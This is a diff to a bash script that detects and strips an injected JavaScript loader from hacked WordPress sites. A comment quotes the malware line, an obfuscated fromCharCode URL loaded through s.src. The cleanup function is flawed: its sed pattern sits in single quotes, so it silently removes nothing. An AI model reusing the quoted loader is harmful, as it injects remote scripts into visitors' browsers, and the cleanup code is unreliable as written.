@@ -27,12 +27,36 @@ fi
 nbfiles=$(find wordpress/ -type f | wc -l)
 echo "WORDPRESS: $nbfiles files in clean install of WP (Jan 2020: 1930 files)"
 
+remove_from_file(){
+  # $1 = file
+  # $2 = pattern
+  orig_file="$1"
+  temp_file="$1.tmp"
+  old_file="$1.hacked"
+
+  size1=$(wc -c $orig_file | cut -d' ' -f1)
+
+  < "$orig_file" sed 's|$2||g' > "$temp_file"
+
+  size2=$(wc -c $temp_file | cut -d' ' -f1)
+
+  if [[ $size1 -ne $size2 ]] ; then
+    # replace by cleaned version
+    mv "$orig_file" "$old_file"
+    mv "$temp_file" "$orig_file"
+  else
+  # undo  cleanup
+    rm "$temp_file"
+  fi
+}
+
 find_suspects(){
 	# $1 = folder
 	# $2 = nb of examples to give
 	### what we are trying to detect:
 	##  var pl = String.fromCharCode(104,116,116,112,115,58,47,47,115,110,105,112,112,101,116,46,97,100,115,102,111,114,109,97,114,107,101,116,46,99,111,109,47,115,97,109,101,46,106,115,63,118,61,51); s.src=pl; 
 	pattern="String.fromCharCode(104,116,116,112"
+	pattern="s.src=pl;"
 	nbsuspect=$(grep -rl "$pattern" "$1" | wc -l)
 	if [[ "$2" -gt 0 ]] ; then
 		grep -rl "$pattern" "$1" | head -$2 >&2
@@ -64,9 +88,15 @@ find "$1" -type f -name wp-config.php 2> /dev/null \
 | while read line ; do
 	WPROOT=$(dirname "$line")
 	echo "## FOLDER $WPROOT"
+	echo "BEFORE: $(find_suspects $WPROOT) suspect files"
 	overwrite "wordpress/wp-admin"	"$WPROOT/"
 	overwrite "wordpress/wp-includes"	"$WPROOT/"
 	overwrite "wordpress/wp-content/themes"	"$WPROOT/wp-content/"
 	overwrite "wordpress/wp-content/plugins/akismet"	"$WPROOT/wp-content/plugins/"
+	grep -rl --include=\*.js "s.src=pl;" "$WPROOT" \
+	| while read jsfile ; do
+		remove_from_file "$jsfile" "s.src=pl;"
+	done
+	echo "AFTER: $(find_suspects $WPROOT) suspect files"
 done
 
